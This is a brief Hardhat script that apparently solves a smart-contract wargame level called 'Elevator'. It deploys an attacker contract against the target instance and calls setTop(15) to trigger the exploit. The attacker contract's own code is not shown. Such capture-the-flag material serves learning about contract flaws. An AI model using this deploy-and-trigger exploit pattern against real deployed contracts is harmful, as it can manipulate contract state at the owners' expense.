const {
    ELEVATOR_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'Elevator') {
    logStartingLevel(levelName);

    if (!ELEVATOR_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, ELEVATOR_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Elevator");
    const contract = factory.attach(ELEVATOR_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("ElevatorAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.setTop(15);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
